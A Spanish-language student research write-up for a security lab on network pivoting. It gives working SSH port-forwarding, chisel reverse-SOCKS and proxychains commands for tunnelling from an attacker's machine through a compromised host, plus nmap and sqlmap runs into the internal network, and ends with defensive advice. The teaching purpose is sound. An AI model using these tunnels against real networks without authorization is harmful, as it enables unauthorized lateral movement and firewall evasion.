# Mini-research — Laboratorio 08

**Tema elegido:** *(uno)*

- [ ] **A.** GTFOBins: qué es, cómo se usa un binario SUID/sudo para escalar, tres
  ejemplos.
- [X] **B.** Pivoting y túneles: cómo se pivotea de verdad (SSH tunneling, chisel,
  proxychains) más allá de un simple curl.
- [ ] **C.** Gestión de secretos: por qué los `.env` en el server son un problema y
  qué los reemplaza (vaults, variables de entorno efímeras, etc.).
- [ ] **D.** De scripts a agentes: qué agrega un agente de IA sobre un script de
  automatización, y qué NO debería decidir solo.

## Desarrollo
## Fuentes (mín. 3, verificables)
## Reflexión (3–5 líneas)

### El problema del `curl` directo

En el R4 del lab, pivotear fue tan simple como correr `curl http://phantomcorp-db/` desde el host comprometido. Eso funciona cuando ya tenés una shell interactiva en el pivot y el servicio destino expone un endpoint HTTP accesible. En un escenario real, el problema es más complejo: el atacante quiere usar sus propias herramientas (nmap, sqlmap, Burp Suite, Metasploit) contra la red interna, **desde su propia máquina**, sin tener que ejecutar cada comando dentro del host comprometido. Para eso existen los túneles.

---

### 1. SSH Tunneling: el pivoting nativo

SSH, además de dar acceso a una shell remota, implementa tres modos de reenvío de puertos que lo convierten en la herramienta de pivoting más ubicua en entornos Linux.

**Local Port Forwarding (`-L`):** Redirige un puerto local del atacante hacia un host/puerto de la red interna, pasando por el pivot. El atacante habla con su propio puerto y el tráfico sale por el otro lado del túnel SSH.

```bash
# El atacante quiere acceder a la DB interna (192.168.1.10:5432)
# a través del pivot (pivot.victima.com):
ssh -L 5432:192.168.1.10:5432 operador@pivot.victima.com
# Ahora: psql -h 127.0.0.1 -p 5432 en la máquina del atacante
# conecta directo a la DB interna.
```

**Remote Port Forwarding (`-R`):** El flujo es inverso: expone un puerto del atacante en el servidor remoto. Útil cuando el atacante no puede conectarse al pivot directamente (firewall que bloquea entrada) pero el pivot sí puede conectarse afuera (conexión saliente de vuelta al atacante).

```bash
# El pivot inicia la conexión SSH hacia el atacante y expone
# el puerto 8080 del atacante en el pivot:
ssh -R 8080:localhost:80 atacante@atacante-ip
```

**Dynamic Port Forwarding (`-D`):** En lugar de redirigir un puerto fijo, crea un **proxy SOCKS** local. Cualquier herramienta que soporte SOCKS puede enrutar todo su tráfico a través del pivot hacia la red interna, sin necesidad de conocer los hosts/puertos de antemano.

```bash
# Crear proxy SOCKS5 en puerto 1080 del atacante:
ssh -D 1080 operador@pivot.victima.com -N
# Ahora proxychains nmap -sT 192.168.1.0/24 escanea la red interna
# como si el nmap corriera dentro del pivot.
```

Este es el modo más poderoso porque generaliza: una sola conexión SSH convierte al pivot en un gateway hacia toda la red interna.

---

### 2. Chisel: túneles HTTP cuando SSH no está disponible

SSH requiere que el puerto 22 esté accesible o que haya un servidor SSH corriendo en el pivot. Frecuentemente ninguna de las dos condiciones se cumple: el pivot es un servidor web sin SSH, el puerto 22 está bloqueado por firewall, o el sistema es Windows.

**Chisel** es una herramienta escrita en Go que implementa el mismo concepto (túneles, proxy SOCKS) pero transportando todo sobre HTTP. Esto lo hace pasar como tráfico web normal, eludiendo muchos firewalls y sistemas de detección.

El modo de operación más usado es el **reverse SOCKS proxy**:

```bash
# [Máquina del atacante] — corre el servidor chisel:
chisel server -p 8000 --reverse

# [Host comprometido / pivot] — el cliente chisel se conecta afuera
# y expone un proxy SOCKS reverso al atacante:
chisel client ATACANTE_IP:8000 R:socks
```

El resultado es idéntico al `ssh -D`: el atacante tiene un proxy SOCKS (por defecto en el puerto 1080) que enruta tráfico hacia la red interna del pivot. La clave de `--reverse` es que **el pivot inicia la conexión hacia el atacante**: si el firewall bloquea entrantes pero permite salientes (la configuración más común), el túnel funciona igual.

Una ventaja adicional es que chisel es un binario único y autocontenido, fácil de transferir al pivot con un simple `wget` o `curl`.

---

### 3. Proxychains: el pegamento que conecta herramientas al proxy

Tanto `ssh -D` como chisel dejan un proxy SOCKS escuchando localmente en la máquina del atacante. El problema: la mayoría de las herramientas de pentesting (nmap, sqlmap, curl, ssh, nc) no saben hablar SOCKS nativamente.

**Proxychains** resuelve esto envolviendo la conexión de red de cualquier proceso Linux para que todo su tráfico TCP pase por el proxy SOCKS configurado. Funciona interponiendo una biblioteca dinámica que redirige las llamadas de red del proceso.

```bash
# Configuración mínima en /etc/proxychains4.conf:
socks5  127.0.0.1  1080

# Uso: anteponer proxychains a cualquier comando:
proxychains nmap -sT -Pn -p 80,443,5432 192.168.1.10
proxychains sqlmap -u "http://192.168.1.10/buscar?q=test"
proxychains ssh usuario@192.168.1.20   # salto de múltiples hops
```

Una limitación importante: proxychains solo funciona con **TCP** (no UDP ni ICMP). Por eso no hay que usar `ping` para verificar que el proxy funciona — siempre fallará. Se usa `curl` o `nmap -sT` (TCP connect scan) en su lugar.

---

### El flujo completo: de R4 a un pivot real

Comparando lo que hicimos en el lab con lo que haría un atacante real:

| | Lab 08 (R4) | Escenario real |
|--|--|--|
| **Herramienta** | `curl` desde el pivot | SSH -D o chisel + proxychains desde la propia máquina |
| **Alcance** | Un endpoint HTTP específico | Toda la red interna: cualquier protocolo, cualquier host |
| **Comodidad** | Hay que ejecutar cada comando dentro del pivot | Las herramientas del atacante corren localmente, usan el pivot de forma transparente |
| **Detección** | Conexión HTTP aislada | Túnel persistente: más fácil de detectar con monitoreo de red |

La defensa más efectiva no es bloquear chisel o SSH específicamente, sino **monitorear conexiones salientes inusuales** desde el pivot (un servidor web no debería iniciar conexiones persistentes hacia IPs externas) y aplicar microsegmentación para que, aunque el pivot esté comprometido, tenga acceso mínimo a la red interna.

---

## Fuentes

1. **SecureLayer7 — What is network pivoting?** (conceptos y herramientas: SSH, chisel, ligolo-ng)
   https://securelayer7.net/learn/lateral-movement/what-is-network-pivoting

2. **SecureLayer7 — What is chisel?** (mecanismo de reverse SOCKS, cómo funciona el modo --reverse)
   https://securelayer7.net/learn/lateral-movement/what-is-chisel

3. **HackingArticles — A Detailed Guide on SSH Port Forwarding / Tunnelling** (ejemplos de -L, -D, -R con demostración práctica)
   https://www.hackingarticles.in/a-detailed-guide-on-ssh-port-forwarding-tunnelling/

4. **HackingArticles — A Detailed Guide on Chisel** (configuración de SOCKS5, integración con proxychains)
   https://www.hackingarticles.in/a-detailed-guide-on-chisel/

5. **GitHub: t3l3machus/pentest-pivoting** (guía compacta con ejemplos de SSH dinámico, chisel, sshuttle y doble pivoting)
   https://github.com/t3l3machus/pentest-pivoting

---

## Reflexión

El `curl` del R4 ilustra el concepto de pivoting pero esconde lo que lo hace poderoso en un ataque real: la capacidad de enrutar **cualquier herramienta** del atacante hacia la red interna sin modificarla. SSH con `-D` y chisel hacen eso convirtiendo el pivot en un proxy SOCKS transparente; proxychains conecta ese proxy con cualquier binario. Lo que más impresiona es el diseño del modo `--reverse` de chisel: da vuelta el modelo cliente-servidor para que sea el host comprometido quien inicie la conexión hacia afuera, aprovechando exactamente la asimetría más común de los firewalls (permiten salientes, bloquean entrantes). La defensa no es bloquear herramientas individuales —siempre van a existir variantes— sino reducir lo que el pivot puede alcanzar si está comprometido: segmentación real, egress filtering, y alertas sobre conexiones persistentes desde servidores que no deberían iniciarlas.